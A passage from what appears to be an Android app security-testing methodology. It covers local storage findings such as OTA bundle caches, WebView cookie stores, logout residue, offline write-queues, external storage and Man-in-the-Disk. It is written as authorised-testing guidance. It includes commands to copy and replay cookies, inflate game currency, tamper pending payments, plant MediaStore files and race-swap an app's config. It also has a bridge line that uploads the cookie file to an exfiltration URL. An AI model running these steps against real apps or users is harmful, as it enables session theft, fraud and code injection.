- **Ruled out when:** The only SDK-persisted values are device-scoped identifiers with no server-side power
  (verify by replaying them and getting a 401/403), or the SDK stores through the platform Keystore. Show
  the replay failing.

### D11-029 · CodePush / expo-updates OTA bundle cache — a second copy of the code and a write target

| | |
|---|---|
| **Severity ceiling** | Medium as an analysis finding; the associated Critical is in D17 |
| **VRT** | outcome-rated; the analysis value is Support |
| **Attacker** | AM-03 (read); AM-09 malicious CDN (the substitution attack, in D17) |
| **Applies to** | React Native apps with CodePush or expo-updates |
| **Maps to** | `CodePushConstants.java` (`CODE_PUSH_FOLDER_PREFIX = "CodePush"`, `STATUS_FILE = "codepush.json"`, `DEFAULT_JS_BUNDLE_NAME = "index.android.bundle"`, `BUNDLE_JWT_FILE = ".codepushrelease"`) |

- **Test:** OTA frameworks cache downloaded JS and assets on disk. That cache is (a) a second copy of the
  code you must analyse — the running bundle, not the one in the APK — and (b) the write target for the OTA
  substitution attack in D17.
- **How:**
```bash
adb shell run-as $PKG ls -laR files/ | head -80
adb shell run-as $PKG ls -la files/CodePush/
adb shell run-as $PKG cat files/CodePush/codepush.json           # currentPackage / previousPackage
adb shell run-as $PKG find files/CodePush -name 'index.android.bundle' -o -name '.codepushrelease'
adb shell run-as $PKG cat shared_prefs/CodePush.xml              # CODE_PUSH_PENDING_UPDATE / FAILED_UPDATES
adb shell run-as $PKG ls -laR files/.expo-internal/ 2>/dev/null
```
- **Proof:** A running bundle in `files/CodePush/<hash>/.../index.android.bundle` whose Hermes `sourceHash`
  differs from the one inside the APK — hard evidence that **the binary you analysed is not the code that
  runs**.
- **Escalation:** -> D17 (OTA substitution / supply chain), -> D19 (the bundle is the RN attack surface),
  -> D14 if the update channel is unpinned.
- **Ruled out when:** No OTA framework is present (`grep -rn 'CodePush\|expo-updates' out/`), or the bundle
  in the cache matches the APK's `sourceHash` and the `.codepushrelease` JWT is verified against a key not
  in the APK.

### D11-030 · Unity `PlayerPrefs` / `persistentDataPath` authoritative game state

| | |
|---|---|
| **Severity ceiling** | High when the server accepts the client value (economy fraud); Low if the server re-derives it |
| **VRT** | outcome-rated; often IAP/economy scope — check the programme |
| **Attacker** | AM-11 physical unlocked; AM-03 with a write primitive |
| **Applies to** | Unity Android games |
| **Maps to** | Il2CppDumper `dump.cs` (locate the `PlayerPrefs` calls); MASWE-0006 |

- **Test:** Unity games persist currency, entitlements and progression in `PlayerPrefs`
  (`shared_prefs/<pkg>.v2.playerprefs.xml`) or `Application.persistentDataPath`, then trust it on load. Flip
  it and see whether the server accepts the inflated value.
- **How:**
```bash
adb shell run-as $PKG cat "shared_prefs/${PKG}.v2.playerprefs.xml"
grep -nE 'PlayerPrefs\.(Set|Get)(Int|Float|String)|persistentDataPath' out/dump.cs | head -40
adb shell run-as $PKG sh -c "sed -i 's/\"coins\">100</\"coins\">999999</' shared_prefs/${PKG}.v2.playerprefs.xml"
adb shell am force-stop $PKG && adb shell monkey -p $PKG 1
```
- **Proof:** The modified value reflected in the UI after relaunch **and** accepted by the server — a
  purchase/redeem call succeeding with the inflated balance, captured in Burp.
- **Escalation:** -> D23 (economy fraud); -> D15 if the value rides an API call the server trusts.
- **Ruled out when:** The server re-derives the balance/entitlement and overrides the local value on next
  sync (show the server correcting your flip). Do not report a client-only value the server ignores.

### D11-031 · WebView cookie store as the exfiltration target

| | |
|---|---|
| **Severity ceiling** | Critical — the cookies replay into the victim's authenticated web session |
| **VRT** | outcome-rated: `broken_authentication_and_session_management.authentication_bypass` (P1) / `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-03 with a reach primitive; AM-02 via a bridge file-read |
| **Applies to** | any app with a WebView carrying a logged-in web session |
| **Maps to** | MASTG-TECH-0142 (Inspecting WebView Storage) |

- **Test:** Testers grep `shared_prefs` and stop. The WebView keeps its own SQLite cookie store, including
  `httpOnly` cookies the JS layer cannot see. Those cookies replayed in a browser land you in the victim's
  authenticated web session — a cross-surface ATO that the app's own session-token hygiene does nothing to
  prevent.
- **How:**
```bash
adb shell run-as $PKG ls -la app_webview/Default/
adb exec-out run-as $PKG cat "app_webview/Default/Cookies" > Cookies.db
sqlite3 Cookies.db 'select host_key,name,is_httponly,substr(value,1,20) from cookies;'
adb shell run-as $PKG ls -laR app_webview/Default/Local\ Storage app_webview/Default/IndexedDB
# LEGACY saved form credentials:
adb shell run-as $PKG cat databases/webview.db 2>/dev/null
```
  Remote path when a bridge exposes a file read:
  `nativeBridge.uploadFile('/data/user/0/'+PKG+'/app_webview/Default/Cookies', exfilUrl)`.
- **Proof:** The cookie rows loaded into a fresh browser profile, landing in the victim's authenticated web
  session — screenshot the logged-in page reached with cookies from the device.
- **Escalation:** -> D13/D15 cross-surface ATO; -> D10 when a bridge or `file://` WebView makes the read
  remote (H1 #44727 stored cleartext creds in `databases/webview.db`).
- **Ruled out when:** The WebView carries no authenticated session (public content only), or the cookie
  store is empty after the web login flow because the app uses a token bridge rather than cookies — verify
  by dumping `Cookies` after logging in through the WebView.

### D11-032 · Firebase / Realtime-DB config and cached documents inside the sandbox

| | |
|---|---|
| **Severity ceiling** | rated on content; the config feeds a potentially Critical D18 finding |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5) for the cache; the open-database outcome is D18 |
| **Attacker** | AM-03 (read); AM-01 for the resulting open-database test |
| **Applies to** | apps using Firebase / Firestore / RTDB |
| **Maps to** | MASTG-KNOW-0039 (Firebase Real-time Databases), MASTG-TECH-0008 |

- **Test:** Beyond the four standard directories, enumerate library-specific stores. A Firebase config here
  (the RTDB URL and project id) is the pivot into a D18 open-database test; the offline cache
  (`files/*.firebase*`, Firestore's local persistence) also holds authenticated documents.
- **How:**
```bash
objection -n "$PKG" start
# then: env   (prints cacheDirectory, filesDirectory, obbDir, packageCodePath)
adb shell run-as $PKG find . -type f | sort
adb shell run-as $PKG ls -la no_backup app_webview files
grep -iE 'firebase_database_url|firebase_url|project_id|storage_bucket' out/res/values/strings.xml
```
- **Proof:** Files outside the expected directories holding markers (a `.realm`, a Firebase cache, a key
  file), or a Firestore/RTDB URL that you then test unauthenticated in D18.
- **Escalation:** -> D18 (open database / misconfigured rules is where the severity is).
- **Ruled out when:** The enumerated stores hold only benign cached content and the Firebase rules reject
  unauthenticated reads (verify the URL in D18). The local cache alone is P5.

### D11-033 · Secrets surviving logout and account switch (shared-device residue)

| | |
|---|---|
| **Severity ceiling** | Medium; High when the residue is a live credential or crosses accounts on a shared device |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES); escalates via `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-05 another user of the same app; AM-11 device handed on/borrowed |
| **Applies to** | all; weight up for apps with an in-app account switcher or a kiosk/shared-device mode |
| **Maps to** | MASWE-0024 (Sensitive Data Accessible After Session Termination); AOSP threat [T.P4] |

- **Test:** Nobody tests what logout leaves *on disk* — which is what the next person to pick up a family
  tablet, a ward device or a POS terminal gets. The high-yield stores are the WebView cookie jar, the HTTP
  cache, the image cache, WorkManager's DB, the FCM registration token and search history. Test three
  things: does logout evict the material; does a live token remain valid server-side; and does account A's
  data survive into account B's session.
- **How:**
```bash
P=/data/data/$PKG
adb shell run-as $PKG find "$P" -type f -exec md5sum {} \; | sort > before.txt   # logged in as A
# log out in the UI, force-stop, then:
adb shell run-as $PKG find "$P" -type f -exec md5sum {} \; | sort > after.txt
diff before.txt after.txt
adb exec-out run-as $PKG sh -c 'grep -rl "<A-token>" . 2>/dev/null'
# then log in as account B and re-run the grep for A's identifiers
adb shell run-as $PKG sqlite3 app_webview/Default/Cookies 'select host_key,name from cookies;'
```
- **Proof:** The post-logout grep still finding account A's session token, **plus** a successful
  authenticated API call with that token (proving it is not server-revoked either); or A's email/phone/PII
  visible while B is the active account. Two `strings | grep` outputs with the identifier visible.
- **Escalation:** -> D13 (the server-side half — a token still valid after logout is the more severe finding;
  test both), full ATO from a shared device.
- **Ruled out when:** The diff shows the credential files removed on logout, the token returns 401 when
  replayed, and a second account's login shows no trace of the first. The server-side revocation half is a
  separate test — do not conflate them.

### D11-034 · Session or entitlement surviving uninstall / reinstall

| | |
|---|---|
| **Severity ceiling** | High — the next device holder resumes an authenticated session |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) if the session resumes without re-auth |
| **Attacker** | AM-11 physical unlocked, device handed on or sold |
| **Applies to** | all; check AccountManager, cloud backup and Keystore-alias persistence |
| **Maps to** | AOSP rule ④ (uninstall is not factory reset); MASWE-0024 |

- **Test:** Verify that reinstalling does not restore a session — via cloud backup, via an account left in
  `AccountManager`, or via a Keystore alias that was never deleted. A device sold or briefly borrowed [T.P4]
  should not retain the previous user's session across a reinstall.
- **How:**
```bash
adb shell dumpsys account | grep -A8 "$PKG"
grep -rn 'deleteEntry(\|KeyStore\.getInstance("AndroidKeyStore")\|AccountManager' out/sources/
adb uninstall $PKG && adb install app.apk
# then launch and observe whether it resumes an authenticated session with no re-auth
```
- **Proof:** After reinstall the app opens an authenticated session without re-authentication — a screen
  recording of the app reaching post-login content on a clean install.
- **Escalation:** -> D13 (session/credential lifecycle), -> D11-051 (the cloud-backup restore is the vehicle).
- **Ruled out when:** Reinstall lands on the login screen, `AccountManager` holds no account for the package
  after uninstall, and Keystore aliases were deleted on logout (or are not shared across a `sharedUserId`).
  Note keystore aliases persist across reinstall only if the app reuses a shared uid or never deleted the key.

### D11-035 · Search history, recent queries and autocomplete cache holding PII

| | |
|---|---|
| **Severity ceiling** | Medium; High if a `SearchRecentSuggestionsProvider` is exported |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5); `broken_access_control.exposed_sensitive_android_intent` (VARIES) if the provider is exported |
| **Attacker** | AM-05 cross-account on a shared device; AM-03 if the provider is exported |
| **Applies to** | any app with a search box that remembers queries |
| **Maps to** | mechanism; `android.content.SearchRecentSuggestionsProvider` |

- **Test:** Search boxes in marketplace, health, banking and messaging apps persist recent queries locally
  (a Room table, a `SharedPreferences` list, or a `SearchRecentSuggestionsProvider`). Queries are frequently
  PII — a name, an account number, a diagnosis, an address. Test persistence, cross-account bleed on the
  same device, and whether the suggestions provider is exported.
- **How:**
```bash
grep -rnE 'SearchRecentSuggestions|SearchRecentSuggestionsProvider|recent_search|searchHistory|saveRecentQuery' out/sources/
grep -n 'android.content.SearchRecentSuggestionsProvider' out/AndroidManifest.xml
adb shell run-as $PKG find . -iname '*search*' -o -iname '*recent*'
adb shell content query --uri content://$PKG.SuggestionProvider/search_suggest_query/a
```
- **Proof:** User A's queries returned while user B is signed in, or returned by `content query` from a
  zero-permission shell — the literal query strings in the output.
- **Escalation:** An exported suggestion provider is also an injection surface -> D07 (test the selection
  args); the cross-account case -> D20.
- **Ruled out when:** No recent-query store exists, the store is per-account and cleared on switch, and any
  `SearchRecentSuggestionsProvider` is `exported="false"`.

### D11-036 · The offline write-queue — tamper the pending mutations before they sync

| | |
|---|---|
| **Severity ceiling** | High when the mutation is financial/state-changing and the server accepts it |
| **VRT** | outcome-rated: `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) or a business-logic node |
| **Attacker** | AM-11 physical unlocked; AM-03 with a write primitive; AM-03 if the queue lands in shared storage |
| **Applies to** | offline-first apps: delivery, field service, notes, banking drafts, retail POS |
| **Maps to** | mechanism; `WorkSpec.input` (WorkManager) |

- **Test:** Offline-first apps serialise pending mutations to disk — a Room "outbox" table, a JSON queue, a
  `WorkManager` input `Data` blob, or a Realm/MMKV store — and replay them on reconnect. If the queue is not
  integrity-protected and the server trusts replayed mutations, edit the pending transaction on disk before
  it syncs.
- **How:**
```bash
grep -rnE 'outbox|pending(Operation|Mutation|Request)|offlineQueue|syncQueue|enqueueUniqueWork|OneTimeWorkRequest|setInputData|Data\.Builder' out/sources/
adb shell svc wifi disable; adb shell svc data disable
# ... perform "transfer 1.00 to me" / "mark order delivered" in the app ...
adb shell run-as $PKG sqlite3 databases/app.db 'select * from pending_ops;'
adb shell run-as $PKG sqlite3 databases/androidx.work.workdb 'select id,worker_class_name,input from WorkSpec;'
adb shell run-as $PKG sqlite3 databases/app.db "update pending_ops set payload=replace(payload,'1.00','5000.00')"
adb shell svc wifi enable
```
- **Proof:** The replayed request in Burp carrying the edited value and the server returning 200 with the new
  state — a balance/order/record changed to the tampered value with no client UI ever showing it.
- **Escalation:** If the queue replays with no idempotency key, replay it N times -> a D15 limit-overrun /
  double-spend; -> D23 for financial mutations.
- **Ruled out when:** The server re-derives the amount/target and re-validates on replay (show it rejecting
  the tampered payload), or the queue entries are signed/HMAC'd with a key not on the device. A server that
  only fixes the local UI is not a finding.

### D11-037 · Chat and media caches that survive "delete for everyone"

| | |
|---|---|
| **Severity ceiling** | Medium; High if the cache lands in shared storage |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5) / `...on_external_storage` (P4); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES) |
| **Attacker** | AM-05 (next user); AM-03 (shared storage) |
| **Applies to** | apps with chat, support chat or user-to-user media |
| **Maps to** | mechanism; MASWE-0024 |

- **Test:** Two failures: a message deleted "for everyone" server-side remains on the recipient's disk, and
  the media cache is not purged on logout/account switch. Both contradict a promise the product made to the
  user.
- **How:**
```bash
# as user A: send/receive an image and a message, then delete-for-everyone from the sender
adb shell run-as $PKG find . -newermt '-10 minutes' -type f | sort
adb shell run-as $PKG sqlite3 databases/chat.db 'select _id,body,deleted,attachment_path from messages;'
# then log out, log in as user B, repeat the find
```
- **Proof:** The deleted message body still present in `messages` (or its attachment still on disk) after the
  UI shows "This message was deleted"; or A's attachment readable while B is the active account.
- **Escalation:** -> D20 (retention/consent); -> D11-041 if the cache is in shared storage where any app
  reads it; -> the backup set (D11-051).
- **Ruled out when:** The delete-for-everyone actually removes the row and the attachment from disk (verify
  with the `find`), and the media cache is scoped per-account and cleared on switch.

### D11-038 · Sensitive data left in a view that is merely hidden

| | |
|---|---|
| **Severity ceiling** | Medium; High if an accessibility-abusing app can read it |
| **VRT** | outcome-rated; the storage-adjacent node is `insecure_data_storage...on_internal_storage` (P5) |
| **Attacker** | AM-04 accessibility-service abuser (banking-trojan model); AM-11 |
| **Applies to** | all |
| **Maps to** | MobSF `android_hiddenui` (CWE-919, masvs storage-7); MASWE-0036 / MASWE-0040 |

- **Test:** `setVisibility(View.GONE | INVISIBLE)` does not clear the value — it stays in the view
  hierarchy, in memory, and in accessibility/UI dumps. A field that is masked on screen but populated in the
  node tree leaks to any accessibility consumer.
- **How:**
```bash
grep -rnE 'setVisibility\((View\.)?(GONE|INVISIBLE)\)' out/sources/ -B6 | grep -inE 'token|password|pan|card|otp|ssn'
adb shell uiautomator dump /sdcard/ui.xml && adb pull /sdcard/ui.xml
grep -io 'text="[^"]*"' ui.xml | head -40
```
- **Proof:** `uiautomator dump` (or an accessibility-service dump) containing the value while it is invisible
  on screen.
- **Escalation:** -> D20/D21 (accessibility abuse); a banking trojan reads the node tree without any storage
  access at all.
- **Ruled out when:** Hidden sensitive fields are cleared (`setText("")`) rather than hidden, or the value
  never enters the node tree. Show the `uiautomator dump` with no `text=` hit for the value.

### D11-039 · No `FLAG_SECURE` — recents snapshot on disk and screen capture

| | |
|---|---|
| **Severity ceiling** | Low (P5) standalone; Medium only with an unmasked credential and a device-access chain |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (**P5**) |
| **Attacker** | AM-11 physical unlocked; AM-04 screen-recording/casting app |
| **Applies to** | all; Android 15 adds automatic screenshare protection for sensitive fields, narrowing it |
| **Maps to** | MobSF `android_prevent_screenshot`; mindedsecurity `MSTG-STORAGE-9` (`$P1 & 8192 == 0`); MASWE-0038; VRT `insecure_data_storage.screen_caching_enabled` (P5) |

- **Test:** Without `FLAG_SECURE`, the OS writes a task-snapshot to disk when the app backgrounds, and the
  screen is capturable by screen-recording/casting. This is P5 and will close on its own — report only when
  the cached screen shows an unmasked credential or PAN **and** you can pair it with a chain that reaches
  the device or the snapshot store.
- **How:**
```bash
grep -rnE 'FLAG_SECURE|setFlags\(WindowManager|addFlags\(' out/sources/    # $P1 & 8192 == 0 means absent
# reproduce: open the sensitive screen, press Home, open Recents, screenshot
adb shell run-as $PKG ls -l /data/system_ce/0/snapshots/ 2>/dev/null       # rooted
```
- **Proof:** The Recents thumbnail (or the on-disk snapshot) rendering the account balance or full card
  number.
- **Escalation:** Only via a chain — D02 backup extraction of the snapshot store, or a D04/D21
  device-compromise scenario. Alone it closes; the exception is a platform-program `FLAG_SECURE`-bypass,
  which is a different finding entirely (defeating a control the app *did* set).
- **Ruled out when:** Sensitive screens set `FLAG_SECURE` (the bitmask test `flags & 0x2000 != 0`), or the
  cached snapshot shows only masked values. Absence of the flag on a non-sensitive screen is not a finding.

### D11-040 · Deleted-record and unallocated-space residue in structured stores

| | |
|---|---|
| **Severity ceiling** | Medium–High by data class; the "we deleted it" claim fails here |
| **VRT** | `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES, CWE-459) |
| **Attacker** | AM-11 physical unlocked; AM-05 |
| **Applies to** | all apps using SQLite/Room, plus external download residue |
| **Maps to** | CWE-459; hackwithsingh sec-14-25 (WAL residue, journal residue, deleted-record unallocated space) |

- **Test:** A SQLite `DELETE` marks pages free but does not zero them; the `-wal`, `-shm` and `-journal`
  siblings and the freelist retain the bytes. "We wipe it on logout / delete account" claims are tested
  here, not on the live table.
- **How:**
```bash
adb exec-out run-as $PKG cat databases/app.db > app.db
adb exec-out run-as $PKG cat databases/app.db-wal > app.db-wal 2>/dev/null
sqlite3 app.db "PRAGMA freelist_count; VACUUM;" # note if VACUUM is what actually clears it
strings app.db app.db-wal | grep -iE 'token|@|[0-9]{12,19}|<deleted-value>'
# external download residue
adb shell find /sdcard/Download -newermt '-1 day' -type f 2>/dev/null
```
- **Proof:** `strings` recovering a value the app claims to have deleted, from the DB body, the WAL, or the
  freelist — quote the value and the flow that "deleted" it.
- **Escalation:** -> D20 (data-deletion / GDPR right-to-erasure), -> D13 if the residue is a session.
- **Ruled out when:** The app runs `VACUUM` (or `PRAGMA secure_delete=ON`) after a delete and `strings`
  recovers nothing from the DB or its siblings, and downloads are removed. Show the empty `strings` output
  after the deletion flow.

### D11-041 · Sensitive data written to external / shared storage (the one class rated above P5)

| | |
|---|---|
| **Severity ceiling** | Medium–High; the VRT rates it P4, a full band above internal storage |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (**P4**, CWE-312, baseline `AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`) |
| **Attacker** | AM-03 zero-permission (legacy/scoped edges); AM-04 with `READ_MEDIA_*` |
| **Applies to** | all; scoped storage (targetSdk 29+, enforced 30) narrows cross-app reads — prove empirically |
| **Maps to** | MASTG-TEST-0200, MASTG-TEST-0201, MASTG-TEST-0202, MASWE-0002, MASTG-KNOW-0042, MASTG-DEMO-0002; VRT `...on_external_storage` (P4) |

- **Test:** External storage is world-readable to any app holding the storage permission and survives
  uninstall — and the VRT prices it P4 versus P5 for the same data internal, *because no root is required*.
  Put "external storage" in the title; it is worth a priority band. Diff `/sdcard` across an app session, and
  hook the write APIs to catch the `MediaStore` path a filesystem diff misses.
- **How:**
```bash
# static
grep -rnE 'getExternalStorageDirectory|getExternalStoragePublicDirectory|getExternalFilesDir|getExternalCacheDir|MediaStore|Environment\.DIRECTORY_' out/sources/
grep -nE 'WRITE_EXTERNAL_STORAGE|MANAGE_EXTERNAL_STORAGE|READ_EXTERNAL_STORAGE|READ_MEDIA_' out/AndroidManifest.xml
# dynamic diff — no root
adb shell 'find /sdcard /storage/emulated/0 -type f' | sort > sd_before.txt
# ... exercise the app ...
adb shell 'find /sdcard /storage/emulated/0 -type f' | sort > sd_after.txt
comm -13 sd_before.txt sd_after.txt
```
```javascript
// catch every Java write path + the MediaStore insert at once
Interceptor.attach(Process.getModuleByName('libc.so').getExportByName('open'), {
  onEnter: function (a) { var p = a[0].readCString();
    if (p && (p.indexOf('/sdcard') === 0 || p.indexOf('/storage/emulated') === 0)) console.log('[open] ' + p); }
});
Java.perform(function () {
  var CR = Java.use('android.content.ContentResolver');
  CR.insert.overload('android.net.Uri','android.content.ContentValues').implementation = function (u, v) {
    console.log('[insert] ' + u + ' ' + v); return this.insert(u, v); };
});
```
- **Proof:** A new file under `/sdcard` created by the app, read **without root** by a second package
  (zero-permission under scoped storage, or with `READ_MEDIA_IMAGES` which users grant routinely), printed
  under that package's own logcat tag. State exactly which permission (if any) the reader needed.
- **Escalation:** -> D20; -> D17 if the app reads code/config back from there (Man-in-the-Disk, D11-046);
  `MANAGE_EXTERNAL_STORAGE` in the manifest is itself an over-broad-permission flag under D03.
- **Ruled out when:** All writes land under `Android/data/<pkg>` on a targetSdk 30+ device and a second app
  is denied the read (`Permission denied` from the PoC app on Android 11+), and nothing sensitive reaches
  `Download/`, `DCIM/` or a public MediaStore collection. State `ro.build.version.sdk` — the cross-app read
  is dead for `Android/data` on 11+ but `Download`/`DCIM`/MediaStore stay broadly readable.

### D11-042 · Scoped-storage bypass and `MANAGE_EXTERNAL_STORAGE` over-request

| | |
|---|---|
| **Severity ceiling** | High for sensitive data in shared storage; Medium for an unjustified All-Files grant |
| **VRT** | `insecure_data_storage...on_external_storage` (P4); the permission over-request is a D03 note |
| **Attacker** | AM-03; AM-04 |
| **Applies to** | **targetSdk 29** legacy opt-out; **targetSdk 30+** the opt-out is ignored |
| **Maps to** | `developer.android.com/about/versions/11/privacy/storage`; AOSP security-model paper Table 3 (Android 10/11 scoped storage) |

- **Test:** External storage is user-controlled data. Establish whether the app holds All-Files access,
  whether it still runs in legacy mode, and whether it writes sensitive data to shared storage. On Android
  11+ `requestLegacyExternalStorage` is ignored and `WRITE_EXTERNAL_STORAGE` grants no additional access;
  `preserveLegacyExternalStorage` preserves legacy behaviour only across an *upgrade*, never a fresh install.
- **How:**
```bash
grep -nE 'MANAGE_EXTERNAL_STORAGE|requestLegacyExternalStorage|preserveLegacyExternalStorage|WRITE_EXTERNAL_STORAGE|READ_MEDIA_' out/AndroidManifest.xml
adb shell dumpsys package $PKG | grep -i MANAGE_EXTERNAL_STORAGE
grep -rnE 'Environment\.getExternalStorageDirectory|getExternalFilesDir|Environment\.isExternalStorageManager|MediaStore\.' out/sources/
adb shell find /sdcard -newer /sdcard -type f 2>/dev/null | head -40
```
- **Proof:** A file at a shared-storage path (not under `Android/data/<pkg>`) holding the app's sensitive
  data, read from an unprivileged shell or a second app; or `dumpsys package` showing
  `MANAGE_EXTERNAL_STORAGE` granted with no functional justification.
- **Escalation:** Shared-storage token/PII -> any app with media permissions reads it (D20); the All-Files
  grant defeats scoped storage for every other app's shared files too.
- **Ruled out when:** `MANAGE_EXTERNAL_STORAGE` is absent (or justified by a documented file-manager
  function), the app targets 30+ so `requestLegacyExternalStorage` is inert, and no sensitive data lands
  outside `Android/data/<pkg>`. Note whether the tested device is a fresh install or an upgrade — the
  answer changes what `preserveLegacyExternalStorage` does.

### D11-043 · Cross-app access to `Android/data` and `Android/obb` (version-gated)

| | |
|---|---|
| **Severity ceiling** | High where it works; **N/A on Android 11+** |
| **VRT** | `insecure_data_storage...on_external_storage` (P4) on affected versions |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY** — Android 10 and below only |
| **Maps to** | `developer.android.com/about/versions/11/privacy/storage` ("Android 11+: Apps cannot access other apps' data directories on internal storage, even if the target app has made files world-readable (API 27 or lower)"); SAF restricted-directory list |

- **Test:** Determine whether the tested platform still permits reading another app's
  `/sdcard/Android/data/<pkg>` directory. On Android 11+ this is blocked, including via SAF. Below that it is
  a direct cross-app read — and the single most common over-claim in mobile reports is asserting it on a
  modern device.
- **How:**
```bash
adb shell getprop ro.build.version.sdk
adb shell cat /sdcard/Android/data/$PKG/files/cache.json 2>&1
adb shell ls /sdcard/Android/data/$PKG/ 2>&1
```
- **Proof:** On an Android 10-or-lower device, a second app reading the target's `Android/data` files and
  showing sensitive contents. On Android 11+, a `Permission denied` proves the platform closes it — do not
  report it there.
- **Escalation:** Cross-app data theft on the affected version -> D13/D20.
- **Ruled out when:** `ro.build.version.sdk >= 30` — the platform blocks it regardless of the target app's
  file modes. Always state the device's API level; a finding that only works on API <= 28 must be labelled
  as such.

### D11-044 · MediaStore `_data` column disclosure and path re-use

| | |
|---|---|
| **Severity ceiling** | Medium — path disclosure plus a write whose destination other apps influence |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) for the path leak; MASWE-0002 for the write |
| **Attacker** | AM-03 (other apps create the MediaStore rows) |
| **Applies to** | API 29+ scoped storage; on API 29 `requestLegacyExternalStorage` re-enables the old behaviour |
| **Maps to** | `developer.android.com/training/data-storage/shared/media` (quoted guidance on `DATA`, `RELATIVE_PATH`, `IS_PENDING`, `setRequireOriginal`, `ACCESS_MEDIA_LOCATION`); MASWE-0002 |

- **Test:** Two separate bugs. (1) The app **returns** `MediaStore.MediaColumns.DATA` to a caller or logs
  it, disclosing absolute paths inside other apps' or the user's storage. (2) The app **writes** using a
  path derived from `DATA` — the docs say plainly "don't use the value of the `DATA` column", because it is
  not guaranteed valid or stable, and other apps create the rows.
- **How:**
```bash
grep -rnE 'MediaStore\.MediaColumns\.DATA|"_data"|MediaColumns\.RELATIVE_PATH|IS_PENDING|setRequireOriginal|ACCESS_MEDIA_LOCATION' out/sources/
adb shell content query --uri content://media/external/images/media --projection _id:_data:relative_path:_display_name | head
```
- **Proof:** The app writing to or reading from a path taken from `_data` (shown by strace-style file access
  or by the file appearing where `_data` pointed), or `_data` values in logcat / network payloads.
- **Escalation:** -> D07 (the disclosed path feeds a traversal), -> D11-045 (the write-side destination is
  attacker-influenced).
- **Ruled out when:** The app never selects `_data` and derives all file access from the content URI via
  `openFileDescriptor`, or it targets 30+ where `_data` is effectively unavailable. Grep confirming no
  `_data` reference is the negative.

### D11-045 · Attacker-controlled `RELATIVE_PATH` / `DISPLAY_NAME` on MediaStore insert

| | |
|---|---|
| **Severity ceiling** | Medium — cross-app content planting; higher if a sibling reads it back by name |
| **VRT** | MASWE-0050; outcome-rated if the planted file is later parsed/loaded |
| **Attacker** | AM-03 |
| **Applies to** | API 29+ apps that insert into MediaStore with a name/subdir derived from remote or IPC data |
| **Maps to** | `developer.android.com/training/data-storage/shared/media`; MASWE-0050 |

- **Test:** When the app inserts into MediaStore using a filename or subdirectory derived from remote or
  IPC-supplied data, the attacker chooses where the file lands (`RELATIVE_PATH`) and what it is called
  (`DISPLAY_NAME`) — including an extension other apps auto-handle. Trace the values back to their source
  (server JSON, share intent, deep-link parameter).
- **How:**
```bash
grep -rnA10 'ContentValues()' out/sources/ | grep -nE 'DISPLAY_NAME|RELATIVE_PATH|MIME_TYPE'
# plant a file at an attacker-chosen path
adb shell content insert --uri content://media/external/file \
  --bind _display_name:s:report.pdf --bind relative_path:s:Download/ --bind mime_type:s:application/pdf
adb shell content query --uri content://media/external/file --projection _display_name:relative_path
```
- **Proof:** A file written to a directory the app never intended (`Download/`, `Pictures/<attacker>/`) with
  an attacker-chosen name, confirmed by `content query`.
- **Escalation:** -> J20 (plant, then be imported): if the app's own "import from device" feature scans that
  directory and keys on the name/MIME, it ingests attacker content with no user selection, reaching the
  parser in D16.
- **Ruled out when:** `RELATIVE_PATH`/`DISPLAY_NAME` are always app-controlled constants, or the insert
  values are sanitised against a fixed subdirectory allowlist. Show the source of the values is not
  attacker-reachable.

### D11-046 · Man-in-the-Disk: app reads executable or trust-bearing data from shared storage

| | |
|---|---|
| **Severity ceiling** | Critical when the substituted artefact is executed; High when it steers config |
| **VRT** | outcome-rated: `server_side_injection.remote_code_execution_rce` (P1) analogue for in-app code execution; file the closest accurate node and request the severity |
| **Attacker** | AM-04 (storage permission); AM-03 where the app uses a public collection or another app holds `MANAGE_EXTERNAL_STORAGE` |
| **Applies to** | strongest below targetSdk 30; still applies where the app deliberately uses a public collection |
| **Maps to** | T1638 Adversary-in-the-Middle (ATT&CK's Man-in-the-Disk description), T1407 Download New Code at Runtime, T1544; MASTG-KNOW-0042 |

- **Test:** Does the app load a config, a DEX/JAR/SO, an update file, or a signature-verification input from
  external storage? Any other app with storage permission can swap it between the app's write and its read.
- **How:**
```bash
grep -rn 'getExternalFilesDir\|/sdcard\|Environment\.getExternalStorage' out/sources/ -A6 | \
  grep -nE 'DexClassLoader|System\.load|ZipFile|unzip|JSONObject|Gson|readObject|BitmapFactory|Properties'
# race the read
while :; do cp evil.json /sdcard/Android/data/$PKG/files/config.json; done
```
- **Proof:** After substituting the file, the app exhibits the injected behaviour — a new endpoint in Burp,
  a changed feature flag on screen, or (best case) attacker code executing (marker file / stack trace with
  the app's UID).
- **Escalation:** -> D17 dynamic code loading — the single most reliable route to in-app RCE on older
  targets; -> D14 if the swapped file is a pinning config.
- **Ruled out when:** The app loads no code or trust-bearing data from external storage (all `DexClassLoader`
  / `System.load` sources are internal), or it integrity-verifies the file with a key not on the device
  before use. Show the load path is internal-only.

### D11-047 · Zip-slip on the app's import/update path (and the `ZipPathValidator` opt-out)

| | |
|---|---|
| **Severity ceiling** | Critical when the write lands on a code path or a trust config; High for arbitrary sandbox write |
| **VRT** | outcome-rated: `server_side_injection.file_inclusion.local` (P1) analogue for the write-to-load chain |
| **Attacker** | AM-02 (a crafted archive delivered via share/download); AM-03 with a co-installed helper |
| **Applies to** | targetSdk 34+ has default protection; the class is universal below it (**LEGACY** test on <34) |
